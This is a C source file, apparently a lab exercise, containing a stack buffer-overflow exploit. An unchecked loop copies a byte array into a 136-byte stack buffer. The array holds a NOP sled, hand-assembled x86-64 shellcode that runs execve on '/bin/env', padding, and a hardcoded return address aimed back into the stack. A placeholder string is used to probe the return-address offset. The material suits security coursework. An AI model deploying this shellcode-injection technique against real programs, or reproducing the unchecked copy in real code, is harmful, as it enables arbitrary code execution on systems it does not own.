#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

void doTest();

int main(int argc, char * argv[]){

    putenv("MD5=8b7588b30498654be2626aac62ef37a3");

    /* call the vulnerable function */
    doTest();

    exit(0);
}

// VAriable to contain hex bytes of shell code
char compromise[159] = {
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 
    0x90,  // 41 nops
    
    // 110 vvv
    // Clears the registers rax, rdi, rsi, and rdx (sets them to 0)
    0x48, 0x31, 0xC0,		    // xor rax, rax
    0x48, 0x31, 0xFF,		    // xor rdi, rdi
    0x48, 0x31, 0xF6,		    // xor rsi, rsi
    0x48, 0x31, 0xD2,		    // xor rdx, rdx

    0x50,                            // push rax
    0x48, 0xBF, 0x2F, 0x62, 0x69, 0x6E, 0x2F, 0x65, 0x6E, //0x76,       // mov rdi, '/bin/env'
    0x76,

    0x57,                            // push rdi
    0x48, 0x89, 0xE7,                // mov rdi, rsp
    0x50,                            // push rax
    0x57,                      	     // push rdi
    0x48, 0x89, 0xE6,                // mov rsi, rsp
    0x48, 0x31, 0xD2,                // xor rdx, rdx
    0x66, 0xBA, 0xFF, 0x7F,          // mov dx, 0x7fff
    0x48, 0xC1, 0xE2, 0x20,          // shl rdx, 32
    0xB9, 0xFF, 0xE6, 0xFB, 0xF7,    // mov ecx, 0xf7fbe6ff

    // Clears the low 8 bits of rcx
    0x48, 0xC1, 0xE9, 0x08,          // shr rcx, 8
    0x48, 0xC1, 0xE1, 0x08,          // shl rcx, 8

    0x48, 0x09, 0xCA,                // or rdx, rcx
    0x48, 0x8B, 0x12,                // mov rdx, [rdx]
    0x48, 0x31, 0xC0,                // xor rax, rax
    0xB0, 0x3B,                      // mov al, 0x3b

    0x0F, 0x05,                      // syscall

    0x48, 0x89, 0xC7,                // mov rdi, rax
    0x48, 0x31, 0xC0,                // xor rax, rax
    0xB0, 0x3C,                      // mov al, 0x3c
    0x0F, 0x05,                      //syscall

    // Padding so that the stack doesn't overflow the code
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,

    // end:
    // rsp: 0x7fffffffe3e8 | 0xE8, 0xE3, 0xFF, 0xFF, 0xFF, 0x7F, 0x00 return address
    // rsp - 152(0x98) = 0x7fffffffe350
    0x50, 0xE3, 0xFF, 0xFF, 0xFF, 0x7F, 0x00,
};

// values for the shell code.
// Environ: 0x7ffff7fbe600
char * compromise1 =
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx" 
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxx"		        // 144 chars
    "MNOPWXYZ"			// 0x4D 0x4E 0x4F 0x50 0x57 0x58 0x59 0x5A
    "xxxxxxxx";
int i;

void doTest(){
// string variable to probe the stack and find the correct
    char buffer[136];
    /* copy the contents of the compromise
       string onto the stack
       - change compromise1 to compromise
         when shell code is written */
    for (i = 0; compromise[i]; i++){
	buffer[i] = compromise[i];
    }
}

